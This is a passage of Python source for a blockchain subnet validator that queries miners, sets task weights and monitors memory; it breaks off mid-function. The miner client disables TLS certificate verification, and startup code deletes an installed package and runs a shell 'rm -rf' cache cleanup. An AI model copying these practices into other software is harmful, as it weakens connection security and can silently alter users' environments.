import gc
import logging
import sys
from datetime import datetime, timezone, timedelta
import os
import time
import threading
import concurrent.futures
import glob
import signal
import sys
import tracemalloc # Added import
import memray # Added for programmatic memray tracking

from gaia.database.database_manager import DatabaseTimeout
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    psutil = None 
    PSUTIL_AVAILABLE = False
    print("psutil not found, memory logging will be skipped.") # Use print for early feedback

os.environ["NODE_TYPE"] = "validator"



import asyncio

# === PERFORMANCE OPTIMIZATION INTEGRATION ===
try:
    from gaia.utils import performance
    print("🚀 [PERFORMANCE] High-performance libraries integration activated")
    # Performance status will be logged when the module is imported
except Exception as e:
    print(f"⚠️ [PERFORMANCE] Performance optimization integration failed: {e}")
# === END PERFORMANCE OPTIMIZATION INTEGRATION ===

# === WEIGHT TRACING INTEGRATION ===
try:
    import sys
    import os
    # Add the root directory to Python path to find runtime_weight_tracer
    root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    if root_dir not in sys.path:
        sys.path.insert(0, root_dir)
    # Enable PyTorch CUDA memory allocation configuration 
    os.environ["PYTORCH_CUDA_ALLOC_CONF"] = "expandable_segments:True"
    import runtime_weight_tracer
    print("🔍 [MAIN] Weight tracing available - enabling...")
    runtime_weight_tracer.enable_weight_tracing()
    print("✅ [MAIN] Weight tracing enabled successfully")
except Exception as e:
    print(f"⚠️ [MAIN] Weight tracing not available: {e}")
# === END WEIGHT TRACING INTEGRATION ===

import ssl
import traceback
import random
from typing import Any, Optional, List, Dict, Set
from dotenv import load_dotenv
from cryptography.fernet import Fernet
import httpx
from fiber.chain import chain_utils, interface
from fiber.chain import weights as w
# Note: get_nodes_for_netuid replaced with process-isolated _fetch_nodes_process_isolated
from fiber.chain.chain_utils import query_substrate
from fiber.logging_utils import get_logger

# Patch query_substrate to handle ProcessIsolatedSubstrate results
_original_query_substrate = query_substrate

def patched_query_substrate(substrate, module: str, storage_function: str, params=None, block_hash=None):
    """Patched version of query_substrate that handles ProcessIsolatedSubstrate results."""
    try:
        result = _original_query_substrate(substrate, module, storage_function, params, block_hash)
        return result
    except AttributeError as e:
        if "'int' object has no attribute 'value'" in str(e) or "'list' object has no attribute 'value'" in str(e):
            # The error is because substrate.query returned a raw value instead of an object with .value
            logger.debug(f"query_substrate compatibility fix: handling .value attribute error")
            
            class CompatibleResult:
                def __init__(self, val):
                    self.value = val
                    self._value = val
                    
                def __str__(self):
                    return str(self.value)
                    
                def __repr__(self):
                    return repr(self.value)
                    
                def __int__(self):
                    return int(self.value) if hasattr(self.value, '__int__') else self.value
                    
                def __len__(self):
                    return len(self.value) if hasattr(self.value, '__len__') else 1
                    
                def __getitem__(self, key):
                    return self.value[key] if hasattr(self.value, '__getitem__') else self.value
                    
                def __iter__(self):
                    return iter(self.value) if hasattr(self.value, '__iter__') else iter([self.value])
            
            # Get the actual result by calling substrate.query directly (this should return the raw value)
            try:
                direct_result = substrate.query(module, storage_function, params, block_hash)
                logger.debug(f"query_substrate compatibility fix: wrapped {type(direct_result).__name__} as CompatibleResult")
                return CompatibleResult(direct_result)
            except Exception as inner_e:
                logger.error(f"query_substrate compatibility fix failed: {inner_e}")
                raise e  # Re-raise original error
        else:
            raise

# Replace the imported function with our patched version
import fiber.chain.chain_utils
fiber.chain.chain_utils.query_substrate = patched_query_substrate
from fiber.encrypted.validator import client as vali_client, handshake
from fiber.encrypted.validator import client as vali_client, handshake
from fiber.chain.metagraph import Metagraph
from fiber.chain.interface import get_substrate
from substrateinterface import SubstrateInterface
from gaia.tasks.defined_tasks.geomagnetic.geomagnetic_task import GeomagneticTask
from gaia.tasks.defined_tasks.soilmoisture.soil_task import SoilMoistureTask
from gaia.APIcalls.miner_score_sender import MinerScoreSender
from gaia.validator.database.validator_database_manager import ValidatorDatabaseManager
from gaia.tasks.base.miner_performance_calculator import (
    MinerPerformanceCalculator,
    calculate_daily_stats
)
from argparse import ArgumentParser
import pandas as pd
import json
from gaia.validator.weights.set_weights import FiberWeightSetter
import base64
import math
from gaia.validator.utils.auto_updater import perform_update
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.orm import declarative_base, sessionmaker
from sqlalchemy import text
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
import numpy as np
from gaia.validator.basemodel_evaluator import BaseModelEvaluator
from gaia.validator.utils.db_wipe import handle_db_wipe
from gaia.validator.utils.earthdata_tokens import ensure_valid_earthdata_token
from gaia.validator.utils.substrate_manager import (
    get_substrate_manager, cleanup_global_substrate_manager,
    get_fresh_substrate_connection, get_process_isolated_substrate, force_substrate_cleanup
)
from gaia.tasks.defined_tasks.weather.weather_task import WeatherTask
from gaia.utils import consensus_metrics
import importlib as _il  
import base64 as _b64    

# Imports for Alembic check
from alembic.config import Config
from alembic import command
from alembic.util import CommandError # Import CommandError
from sqlalchemy import create_engine, pool

# New imports for DB Sync
# Legacy backup/restore managers removed - using AutoSyncManager only
from gaia.validator.sync.auto_sync_manager import get_auto_sync_manager
import random # for staggering db sync tasks

logger = get_logger(__name__)


async def perform_handshake_with_retry(
    httpx_client: httpx.AsyncClient,
    server_address: str,
    keypair: Any,
    miner_hotkey_ss58_address: str,
    max_retries: int = 2,
    base_timeout: float = 15.0
) -> tuple[str, str]:
    """
    Custom handshake function with retry logic and progressive timeouts.
    
    Args:
        httpx_client: The HTTP client to use
        server_address: Miner server address
        keypair: Validator keypair
        miner_hotkey_ss58_address: Miner's hotkey address
        max_retries: Maximum number of retry attempts
        base_timeout: Base timeout for handshake operations
    
    Returns:
        Tuple of (symmetric_key_str, symmetric_key_uuid)
    """
    last_exception = None
    
    for attempt in range(max_retries + 1):
        # Progressive timeout: increase timeout with each retry
        current_timeout = base_timeout * (1.5 ** attempt)
        
        try:
            logger.debug(f"Handshake attempt {attempt + 1}/{max_retries + 1} with timeout {current_timeout:.1f}s")
            
            # Get public key with current timeout
            public_key_encryption_key = await asyncio.wait_for(
                handshake.get_public_encryption_key(
                    httpx_client, 
                    server_address, 
                    timeout=int(current_timeout)
                ),
                timeout=current_timeout
            )
            
            # Generate symmetric key
            symmetric_key: bytes = os.urandom(32)
            symmetric_key_uuid: str = os.urandom(32).hex()
            
            # Send symmetric key with current timeout
            success = await asyncio.wait_for(
                handshake.send_symmetric_key_to_server(
                    httpx_client,
                    server_address,
                    keypair,
                    public_key_encryption_key,
                    symmetric_key,
                    symmetric_key_uuid,
                    miner_hotkey_ss58_address,
                    timeout=int(current_timeout),
                ),
                timeout=current_timeout
            )
            
            if success:
                symmetric_key_str = base64.b64encode(symmetric_key).decode()
                return symmetric_key_str, symmetric_key_uuid
            else:
                raise Exception("Handshake failed: server returned unsuccessful status")
                
        except (asyncio.TimeoutError, httpx.TimeoutException, httpx.ConnectTimeout, httpx.ReadTimeout) as e:
            last_exception = e
            if attempt < max_retries:
                wait_time = 1.0 * (attempt + 1)  # Progressive backoff
                logger.warning(f"Handshake timeout on attempt {attempt + 1}, retrying in {wait_time:.1f}s...")
                await asyncio.sleep(wait_time)
                continue
            else:
                logger.error(f"Handshake failed after {max_retries + 1} attempts due to timeout")
                break
        except Exception as e:
            last_exception = e
            if attempt < max_retries:
                wait_time = 1.0 * (attempt + 1)
                logger.warning(f"Handshake error on attempt {attempt + 1}: {type(e).__name__} - {e}, retrying in {wait_time:.1f}s...")
                await asyncio.sleep(wait_time)
                continue
            else:
                logger.error(f"Handshake failed after {max_retries + 1} attempts due to error: {type(e).__name__} - {e}")
                break
    
    # If we get here, all attempts failed
    raise last_exception or Exception("Handshake failed after all retry attempts")


class GaiaValidator:
    def _check_and_fix_asyncio_compatibility(self):
        """
        CRITICAL: Check for and fix asyncio compatibility issues that break multiprocessing.
        
        Problem: Old asyncio packages (e.g., v3.4.3) use 'async' as a function name,
        but 'async' became a reserved keyword in Python 3.7+. This causes SyntaxError
        in multiprocessing workers when they try to import the validator module.
        
        Solution: Detect and remove problematic asyncio packages, forcing use of built-in asyncio.
        """
        try:
            import sys
            import os
            import shutil
            
            print("[STARTUP] Checking asyncio compatibility for multiprocessing...")
            
            # Check if we're using a problematic asyncio installation
            problematic_asyncio_detected = False
            asyncio_package_path = None
            
            # Look for asyncio package in site-packages
            for path in sys.path:
                if 'site-packages' in path:
                    potential_asyncio_path = os.path.join(path, 'asyncio')
                    potential_asyncio_dist = os.path.join(path, 'asyncio-3.4.3.dist-info')
                    
                    if os.path.exists(potential_asyncio_path) and os.path.exists(potential_asyncio_dist):
                        print(f"[STARTUP] ⚠️ Detected problematic asyncio package at: {potential_asyncio_path}")
                        problematic_asyncio_detected = True
                        asyncio_package_path = path
                        break
            
            if not problematic_asyncio_detected:
                print("[STARTUP] ✅ No problematic asyncio packages detected")
                return
            
            # Test if asyncio import would cause syntax errors in multiprocessing context
            try:
                # Quick test - try to import asyncio and check its file location
                import asyncio
                asyncio_file = asyncio.__file__
                
                if 'site-packages' in asyncio_file and 'asyncio' in asyncio_file:
                    print(f"[STARTUP] ❌ Asyncio importing from site-packages: {asyncio_file}")
                    print("[STARTUP] This will cause multiprocessing worker failures!")
                    
                    # Attempt to fix by removing the problematic package
                    asyncio_dir = os.path.join(asyncio_package_path, 'asyncio')
                    asyncio_dist_dir = os.path.join(asyncio_package_path, 'asyncio-3.4.3.dist-info')
                    
                    print(f"[STARTUP] 🔧 Attempting to remove problematic asyncio package...")
                    
                    # Remove the asyncio package directory
                    if os.path.exists(asyncio_dir):
                        shutil.rmtree(asyncio_dir)
                        print(f"[STARTUP] Removed: {asyncio_dir}")
                    
                    # Remove the distribution info
                    if os.path.exists(asyncio_dist_dir):
                        shutil.rmtree(asyncio_dist_dir)
                        print(f"[STARTUP] Removed: {asyncio_dist_dir}")
                    
                    # Clear import cache to force reimport of built-in asyncio
                    if 'asyncio' in sys.modules:
                        del sys.modules['asyncio']
                    if 'asyncio.base_events' in sys.modules:
                        del sys.modules['asyncio.base_events']
                    
                    # Clear import cache
                    import importlib
                    if hasattr(importlib, 'invalidate_caches'):
                        importlib.invalidate_caches()
                    
                    # Verify the fix worked
                    try:
                        import asyncio
                        new_asyncio_file = asyncio.__file__
                        if '/usr/lib/python' in new_asyncio_file:
                            print(f"[STARTUP] ✅ Successfully fixed asyncio! Now using: {new_asyncio_file}")
                            
                            # Test that multiprocessing can import asyncio without syntax errors
                            import multiprocessing
                            import subprocess
                            test_result = subprocess.run([
                                sys.executable, '-c', 
                                'import asyncio; print("✅ Asyncio import successful in subprocess")'
                            ], capture_output=True, text=True, timeout=10)
                            
                            if test_result.returncode == 0:
                                print("[STARTUP] ✅ Asyncio multiprocessing compatibility verified")
                            else:
                                print(f"[STARTUP] ⚠️ Asyncio test failed: {test_result.stderr}")
                                
                        else:
                            print(f"[STARTUP] ⚠️ Asyncio still not using built-in version: {new_asyncio_file}")
                    except Exception as verify_err:
                        print(f"[STARTUP] ⚠️ Error verifying asyncio fix: {verify_err}")
                        
                else:
                    print(f"[STARTUP] ✅ Asyncio using built-in version: {asyncio_file}")
                    
            except Exception as test_err:
                print(f"[STARTUP] ⚠️ Error testing asyncio: {test_err}")
                
        except Exception as e:
            print(f"[STARTUP] ⚠️ Warning: Asyncio compatibility check failed: {e}")
            # Don't fail startup - this is a non-critical optimization

    def _clear_pycache_files(self):
        """Clear all Python bytecode cache files in the repository to prevent caching issues."""
        try:
            import subprocess
            import os
            
            # Get the repository root (where this file is located, go up to find gaia root)
            repo_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            
            print(f"[STARTUP] Clearing Python cache files in {repo_root}...")
            
            # Clear .pyc files
            cmd_pyc = f"find {repo_root} -name '*.pyc' -delete"
            result_pyc = subprocess.run(cmd_pyc, shell=True, capture_output=True, text=True)
            
            # Clear __pycache__ directories  
            cmd_pycache = f"find {repo_root} -name '__pycache__' -type d -exec rm -rf {{}} + 2>/dev/null || true"
            result_pycache = subprocess.run(cmd_pycache, shell=True, capture_output=True, text=True)
            
            # Clear Python import cache
            import importlib
            if hasattr(importlib, 'invalidate_caches'):
                importlib.invalidate_caches()
            
            print("[STARTUP] ✅ Python cache cleanup completed")
            
        except Exception as e:
            print(f"[STARTUP] ⚠️ Warning: Failed to clear Python cache: {e}")
            # Don't fail startup if cache clearing fails
            
    def __init__(self, args):
        """
        Initialize the GaiaValidator with provided arguments.
        """
        print("[STARTUP DEBUG] Starting GaiaValidator.__init__")
        
        # CRITICAL: Check for asyncio compatibility issues that break multiprocessing
        self._check_and_fix_asyncio_compatibility()
        
        # Clear Python bytecode cache on startup to prevent caching issues
        if os.getenv('VALIDATOR_CLEAR_PYCACHE_ON_STARTUP', 'true').lower() in ['true', '1', 'yes']:
            self._clear_pycache_files()
        
        self.args = args
        self.metagraph = None
        self.config = None
        self.database_manager = ValidatorDatabaseManager()
        
        # MEMORY LEAK FIX: Task tracking for proper cleanup
        self._background_tasks = set()  # Track all background tasks
        self._task_cleanup_lock = asyncio.Lock()
        
        self.soil_task = SoilMoistureTask(
            db_manager=self.database_manager,
            node_type="validator",
            test_mode=args.test,
        )
        self.geomagnetic_task = GeomagneticTask(
            node_type="validator",
            db_manager=self.database_manager,
            test_mode=args.test
        )
        self.weather_task = WeatherTask(
            db_manager=self.database_manager,
            node_type="validator",
            test_mode=args.test,
        )
        
        # Initialize performance calculator for tracking miner statistics
        self.performance_calculator = None  # Will be initialized when database is ready
        self.last_performance_calculation = 0  # Track last calculation time
        
        self.weights = [0.0] * 256
        self.last_set_weights_block = 0
        
        # Shared block info cache to reduce redundant substrate queries
        self._shared_block_cache = {
            'block_number': None,
            'last_update_time': 0,
            'cache_duration': 30  # 30 seconds cache
        }
        self.current_block = 0
        self.nodes = {}
        self.memray_tracker: Optional[memray.Tracker] = None # For programmatic memray

        # Initialize HTTP clients first
        # Client for miner communication with SSL verification disabled
        import ssl
        
        # Create SSL context that doesn't verify certificates
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        self.miner_client = httpx.AsyncClient(
            timeout=httpx.Timeout(connect=15.0, read=60.0, write=30.0, pool=10.0),  # INCREASED: More reasonable timeouts for network latency
            follow_redirects=True,
            verify=False,
            limits=httpx.Limits(
                max_connections=60,   # REDUCED: 100->60 to prevent resource exhaustion
                max_keepalive_connections=20,  # REDUCED: 50->20 to reduce memory pressure
                keepalive_expiry=60,  # REDUCED: 300->60 seconds for faster cleanup
            ),
            transport=httpx.AsyncHTTPTransport(
                retries=2,  # INCREASED: Allow more retries for better reliability
                verify=False,
            ),
        )
        # Client for API communication with SSL verification enabled
        self.api_client = httpx.AsyncClient(
            timeout=30.0,
            follow_redirects=True,
            limits=httpx.Limits(
                max_connections=100,
                max_keepalive_connections=20,
                keepalive_expiry=30,
            ),
            transport=httpx.AsyncHTTPTransport(retries=3),
        )

        # Now create MinerScoreSender with the initialized api_client
        self.miner_score_sender = MinerScoreSender(database_manager=self.database_manager,
                                                   api_client=self.api_client)

        self.last_successful_weight_set = time.time()
        self.last_successful_dereg_check = time.time()
        self.last_successful_db_check = time.time()
        self.last_metagraph_sync = time.time()
        
        # task health tracking
        self.task_health = {
            'scoring': {
                'last_success': time.time(),
                'errors': 0,
                'status': 'idle',
                'current_operation': None,
                'operation_start': None,
                'timeouts': {
                    'default': 1800,  # 30 minutes
                    'weight_setting': 300,  # 5 minutes
                },
                'resources': {
                    'memory_start': 0,
                    'memory_peak': 0,
                    'cpu_percent': 0,
                    'open_files': 0,
                    'threads': 0,
                    'last_update': None
                }
            },
            'deregistration': {
                'last_success': time.time(),
                'errors': 0,
                'status': 'idle',
                'current_operation': None,
                'operation_start': None,
                'timeouts': {
                    'default': 1800,  # 30 minutes
                    'db_check': 300,  # 5 minutes
                },
                'resources': {
                    'memory_start': 0,
                    'memory_peak': 0,
                    'cpu_percent': 0,
                    'open_files': 0,
                    'threads': 0,
                    'last_update': None
                }
            },
            'geomagnetic': {
                'last_success': time.time(),
                'errors': 0,
                'status': 'idle',
                'current_operation': None,
                'operation_start': None,
                'timeouts': {
                    'default': 1800,  # 30 minutes
                    'data_fetch': 300,  # 5 minutes
                    'miner_query': 600,  # 10 minutes
                },
                'resources': {
                    'memory_start': 0,
                    'memory_peak': 0,
                    'cpu_percent': 0,
                    'open_files': 0,
                    'threads': 0,
                    'last_update': None
                }
            },
            'soil': {
                'last_success': time.time(),
                'errors': 0,
                'status': 'idle',
                'current_operation': None,
                'operation_start': None,
                'timeouts': {
                    'default': 3600,  # 1 hour
                    'data_download': 1800,  # 30 minutes
                    'miner_query': 1800,  # 30 minutes
                    'region_processing': 900,  # 15 minutes
                },
                'resources': {
                    'memory_start': 0,
                    'memory_peak': 0,
                    'cpu_percent': 0,
                    'open_files': 0,
                    'threads': 0,
                    'last_update': None
                }
            }
        }
        
        self.watchdog_timeout = 3600  # 1 hour default timeout
        self.db_check_interval = 300  # 5 minutes
        self.metagraph_sync_interval = 300  # 5 minutes
        self.max_consecutive_errors = 3
        self.watchdog_running = False

        # Setup signal handlers for graceful shutdown
        self._cleanup_done = False
        self._shutdown_event = asyncio.Event()
        for sig in (signal.SIGTERM, signal.SIGINT, signal.SIGHUP):
            signal.signal(sig, self._signal_handler)

        # Add lock for miner table operations
        self.miner_table_lock = asyncio.Lock()
        
        # Add lock for metagraph sync to prevent concurrent syncs
        self.metagraph_sync_lock = asyncio.Lock()
        
        # Track substrate connection age for reuse (10 minute reuse window)
        self.substrate_connection_created_at = 0
        self.substrate_reuse_window = 600  # 10 minutes

        # Memory monitoring configuration
        self.memory_monitor_enabled = os.getenv('VALIDATOR_MEMORY_MONITORING_ENABLED', 'true').lower() in ['true', '1', 'yes']
        self.pm2_restart_enabled = os.getenv('VALIDATOR_PM2_RESTART_ENABLED', 'true').lower() in ['true', '1', 'yes']
        
        # REALISTIC MEMORY THRESHOLDS - Appropriate for 32GB systems running weather scoring
        self.memory_warning_threshold_mb = int(os.getenv('VALIDATOR_MEMORY_WARNING_THRESHOLD_MB', '20000'))  # 20GB (62% of 32GB) - informational only
        self.memory_emergency_threshold_mb = int(os.getenv('VALIDATOR_MEMORY_EMERGENCY_THRESHOLD_MB', '25000'))  # 25GB (78% of 32GB) - light GC, close monitoring  
        self.memory_critical_threshold_mb = int(os.getenv('VALIDATOR_MEMORY_CRITICAL_THRESHOLD_MB', '29000'))  # 29GB (90% of 32GB) - restart to avoid OOM
        
        # Memory monitoring state
        self.last_memory_log_time = 0
        self.memory_log_interval = 300  # Log memory status every 5 minutes
        self.last_emergency_gc_time = 0
        self.emergency_gc_cooldown = 60  # Minimum 60 seconds between emergency GC attempts

        self.basemodel_evaluator = BaseModelEvaluator(
            db_manager=self.database_manager,
            test_mode=self.args.test if hasattr(self.args, 'test') else False
        )
        logger.info("BaseModelEvaluator initialized")
        
        # DB Sync components
        self.auto_sync_manager = None  # Streamlined sync system using pgBackRest + R2
        
        self.is_source_validator_for_db_sync = os.getenv("IS_SOURCE_VALIDATOR_FOR_DB_SYNC", "False").lower() == "true"
        
        # DB Sync interval & mode
        if self.args.test:
            self.db_sync_interval_hours = 0.25 # 15 minutes for testing
            logger.info(f"Test mode enabled: DB sync interval set to {self.db_sync_interval_hours} hours (15 minutes).")
        else:
            # Default to 1 hour, allow override by env var for non-test mode
            self.db_sync_interval_hours = int(os.getenv("DB_SYNC_INTERVAL_HOURS", "1"))
            if self.db_sync_interval_hours <= 0:
                logger.warning(f"DB_SYNC_INTERVAL_HOURS ('{os.getenv('DB_SYNC_INTERVAL_HOURS')}') is invalid ({self.db_sync_interval_hours}). Defaulting to 1 hour.")
                self.db_sync_interval_hours = 1
            logger.info(f"DB sync interval set to {self.db_sync_interval_hours} hours.")

        # For database monitor plotting
        self.db_monitor_history = []
        self.db_monitor_history_lock = asyncio.Lock()
        self.DB_MONITOR_HISTORY_MAX_SIZE = 120 # e.g., 2 hours of data if monitor runs every minute

        self.validator_uid = None

        # --- Stepped Task Weight ---
        self.task_weight_schedule = [
            (datetime(2025, 5, 28, 0, 0, 0, tzinfo=timezone.utc), 
             {"weather": 0.50, "geomagnetic": 0.25, "soil": 0.25}),
            
            # Transition Point 1: June 1st, 2025, 00:00:00 UTC
            (datetime(2025, 6, 1, 0, 0, 0, tzinfo=timezone.utc), 
             {"weather": 0.65, "geomagnetic": 0.175, "soil": 0.175}), 
            
            # Target Weights: June 5th, 2025, 00:00:00 UTC
            (datetime(2025, 6, 5, 0, 0, 0, tzinfo=timezone.utc), 
             {"weather": 0.80, "geomagnetic": 0.10, "soil": 0.10})
        ]

        self.tracemalloc_snapshot1: Optional[tracemalloc.Snapshot] = None # Initialize for the snapshot taker task

        print("[STARTUP DEBUG] Validating task weight schedule")
        for dt_thresh, weights_dict in self.task_weight_schedule:
            if not math.isclose(sum(weights_dict.values()), 1.0):
                logger.error(f"Task weights for threshold {dt_thresh.isoformat()} do not sum to 1.0! Sum: {sum(weights_dict.values())}. Fix configuration.")

        # Initialize substrate connection manager (will be set up in setup_neuron)
        print("[STARTUP DEBUG] Initializing substrate manager")
        
        print("[STARTUP DEBUG] GaiaValidator.__init__ completed")

    def _signal_handler(self, signum, frame):
        """Handle shutdown signals gracefully."""
        signame = signal.Signals(signum).name
        logger.info(f"Received shutdown signal {signame}")
        if not self._cleanup_done:
            # Set shutdown event
            if asyncio.get_event_loop().is_running():
                # If in event loop, just set the event
                logger.info("Setting shutdown event in running loop")
                self._shutdown_event.set()
            else:
                # If not in event loop (e.g. direct signal), run cleanup
                logger.info("Creating new loop for shutdown")
                try:
                    loop = asyncio.get_event_loop()
                except RuntimeError:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                loop.run_until_complete(self._initiate_shutdown())

    async def _initiate_shutdown(self):
        """Handle graceful shutdown of the validator."""
        if self._cleanup_done:
            logger.info("Cleanup already completed")
            return

        logger.info("Initiating graceful shutdown sequence...")

        try:
            logger.info("Setting shutdown event (if not already set)...")
            self._shutdown_event.set()
            
            logger.info("Stopping watchdog (if running)...")
            if self.watchdog_running:
                await self.stop_watchdog()
                logger.info("Watchdog stopped.")
            else:
                logger.info("Watchdog was not running.")
            
            # Create cleanup completion file early for auto updater
            # PM2 will handle any remaining background processes
            logger.info("Creating cleanup completion file for auto updater...")
            try:
                cleanup_file = "/tmp/validator_cleanup_done"
                with open(cleanup_file, "w") as f:
                    f.write(f"Cleanup initiated at {time.time()}\n")
                logger.info(f"Created cleanup completion file: {cleanup_file}")
            except Exception as e_cleanup_file:
                logger.error(f"Failed to create cleanup completion file: {e_cleanup_file}")
            
            logger.info("Updating task statuses to 'stopping'...")
            for task_name in ['soil', 'geomagnetic', 'weather', 'scoring', 'deregistration', 'status_logger', 'db_sync_backup', 'db_sync_restore', 'miner_score_sender', 'earthdata_token', 'db_monitor', 'plot_db_metrics']:
                try:
                    # Check if task exists in health tracking before updating
                    if task_name in self.task_health or hasattr(self, f"{task_name}_task") or (task_name.startswith("db_sync") and self.auto_sync_manager):
                        await self.update_task_status(task_name, 'stopping')
                    else:
                        logger.debug(f"Skipping status update for non-existent/inactive task: {task_name}")
                except Exception as e_status_update:
                    logger.error(f"Error updating {task_name} task status during shutdown: {e_status_update}")

            logger.info("Cleaning up resources (DB connections, HTTP clients, etc.)...")
            try:
                # Add timeout for cleanup to prevent hanging
                await asyncio.wait_for(self.cleanup_resources(), timeout=30)
                logger.info("Resource cleanup completed.")
            except asyncio.TimeoutError:
                logger.warning("Resource cleanup timed out after 30 seconds, proceeding with shutdown")
            except Exception as e_cleanup:
                logger.error(f"Error during resource cleanup: {e_cleanup}")
            
            logger.info("Performing final garbage collection...")
            try:
                import gc
                gc.collect()
                logger.info("Final garbage collection completed.")
            except Exception as e_gc:
                logger.error(f"Error during final garbage collection: {e_gc}")
            
            self._cleanup_done = True
            logger.info("Graceful shutdown sequence fully completed.")
            
        except Exception as e_shutdown_main:
            logger.error(f"Error during main shutdown sequence: {e_shutdown_main}", exc_info=True)
            # Ensure cleanup_done is set even if part of the main shutdown fails, to prevent re-entry
            self._cleanup_done = True 
            logger.warning("Graceful shutdown sequence partially completed due to error.")
            
            # Still try to create cleanup completion file even if shutdown had errors
            try:
                cleanup_file = "/tmp/validator_cleanup_done"
                with open(cleanup_file, "w") as f:
                    f.write(f"Cleanup completed with errors at {time.time()}\n")
                logger.info(f"Created cleanup completion file (with errors): {cleanup_file}")
            except Exception as e_cleanup_file:
                logger.error(f"Failed to create cleanup completion file after error: {e_cleanup_file}")

    def _get_substrate_interface(self):
        """
        Get substrate interface with process isolation to prevent ABC memory leaks.
        This replaces direct substrate usage to avoid accumulating ABC objects.
        """
        try:
            # Use process-isolated substrate interface to prevent ABC object accumulation
            return get_process_isolated_substrate(
                subtensor_network=self.subtensor_network,
                chain_endpoint=self.subtensor_chain_endpoint
            )
        except Exception as e:
            logger.warning(f"Failed to create process-isolated substrate interface: {e}")
            # Fallback to regular substrate interface
            logger.info("Falling back to regular substrate interface")
            return get_fresh_substrate_connection(
                subtensor_network=self.subtensor_network,
                chain_endpoint=self.subtensor_chain_endpoint,
                use_process_isolation=False
            )

    def setup_neuron(self) -> bool:
        """
        Set up the neuron with necessary configurations and connections.
        """
        try:
            load_dotenv(".env")
            self.netuid = (
                self.args.netuid if self.args.netuid else int(os.getenv("NETUID", 237))
            )
            logger.info(f"Using netuid: {self.netuid}")

            self.subtensor_chain_endpoint = (
                self.args.subtensor.chain_endpoint
                if hasattr(self.args, "subtensor")
                   and hasattr(self.args.subtensor, "chain_endpoint")
                else os.getenv(
                    "SUBTENSOR_ADDRESS", "wss://test.finney.opentensor.ai:443/"
                )
            )

            self.subtensor_network = (
                self.args.subtensor.network
                if hasattr(self.args, "subtensor")
                   and hasattr(self.args.subtensor, "network")
                else os.getenv("SUBTENSOR_NETWORK", "test")
            )

            self.wallet_name = (
                self.args.wallet
                if self.args.wallet
                else os.getenv("WALLET_NAME", "default")
            )
            self.hotkey_name = (
                self.args.hotkey
                if self.args.hotkey
                else os.getenv("HOTKEY_NAME", "default")
            )
            self.keypair = chain_utils.load_hotkey_keypair(
                self.wallet_name, self.hotkey_name
            )

            original_query = SubstrateInterface.query
            def query_wrapper(self, module, storage_function, params, block_hash=None):
                result = original_query(self, module, storage_function, params, block_hash)
                if hasattr(result, 'value'):
                    if isinstance(result.value, list):
                        result.value = [int(x) if hasattr(x, '__int__') else x for x in result.value]
                    elif hasattr(result.value, '__int__'):
                        result.value = int(result.value)
                return result
            
            SubstrateInterface.query = query_wrapper

            original_blocks_since = w.blocks_since_last_update
            def blocks_since_wrapper(substrate, netuid, node_id):
                resp = self.substrate.rpc_request("chain_getHeader", [])  
                hex_num = resp["result"]["number"]
                current_block = int(hex_num, 16)
                last_updated_value = substrate.query(
                    "SubtensorModule",
                    "LastUpdate",
                    [netuid]
                )
                if last_updated_value is None or node_id >= len(last_updated_value):
                    return None
                last_update = int(last_updated_value[node_id])
                return current_block - last_update
            
            w.blocks_since_last_update = blocks_since_wrapper

            # Use isolated substrate interface for complete ABC memory leak prevention
            try:
                self.substrate = self._get_substrate_interface()
                self.substrate_connection_created_at = time.time()  # Track initial connection age
                logger.info("🛡️  Created isolated substrate interface for memory leak prevention")
            except Exception as e_sub_init:
                logger.error(f"CRITICAL: Failed to initialize isolated substrate interface with endpoint {self.subtensor_chain_endpoint}: {e_sub_init}", exc_info=True)
                return False

            # Standard Metagraph Initialization
            try:
                self.metagraph = Metagraph(substrate=self.substrate, netuid=self.netuid)
            except Exception as e_meta_init:
                logger.error(f"CRITICAL: Failed to initialize Metagraph: {e_meta_init}", exc_info=True)
                return False

            # Standard Metagraph Sync
            try:
                # Use direct sync here since _sync_metagraph is async and we're in sync method
                # Reuse the substrate connection we just created for initial sync
                self.metagraph.substrate = self.substrate
                self.metagraph.sync_nodes()  # Sync nodes after initialization
                logger.info(f"Successfully synced {len(self.metagraph.nodes) if self.metagraph.nodes else '0'} nodes from the network.")
            except Exception as e_meta_sync:
                logger.error(f"CRITICAL: Metagraph sync_nodes() FAILED: {e_meta_sync}", exc_info=True)
                return False # Sync failure is critical for neuron operation

            # Use shorter timeout for setup operations to fail faster when network is down
            resp = self.substrate.rpc_request("chain_getHeader", [], timeout=30.0)  
            hex_num = resp["result"]["number"]
            self.current_block = int(hex_num, 16)
            logger.info(f"Initial block number type: {type(self.current_block)}, value: {self.current_block}")
            self.last_set_weights_block = self.current_block - 300

            if self.validator_uid is None:
                self.validator_uid = self.substrate.query(
                    "SubtensorModule", 
                    "Uids", 
                    [self.netuid, self.keypair.ss58_address]
                )
            validator_uid = self.validator_uid

            return True
        except Exception as e:
            logger.error(f"Error setting up neuron: {e}")
            logger.error(traceback.format_exc())
            return False

    def custom_serializer(self, obj):
        """Custom JSON serializer for handling datetime objects and bytes."""
        if isinstance(obj, (pd.Timestamp, datetime.datetime)):
            return obj.isoformat()
        elif isinstance(obj, bytes):
            return {
                "_type": "bytes",
                "encoding": "base64",
                "data": base64.b64encode(obj).decode("ascii"),
            }
        raise TypeError(f"Type {type(obj)} not serializable")
    
    def serialize_for_miners(self, payload: Dict) -> bytes:
        """Optimized serialization for miner communication using performance utilities."""
        try:
            from gaia.utils.performance import serialize_miner_payload
            return serialize_miner_payload(payload)
        except ImportError:
            # Fallback to standard JSON if performance utils not available
            import json
            return json.dumps(payload, default=self.custom_serializer).encode('utf-8')

    async def query_miners(self, payload: Dict, endpoint: str, hotkeys: Optional[List[str]] = None) -> Dict:
        """Query miners with the given payload in parallel with batch retry logic."""
        try:
            logger.info(f"Querying miners for endpoint {endpoint} with payload size: {len(str(payload))} bytes. Specified hotkeys: {hotkeys if hotkeys else 'All/Default'}")
            if "data" in payload and "combined_data" in payload["data"]:
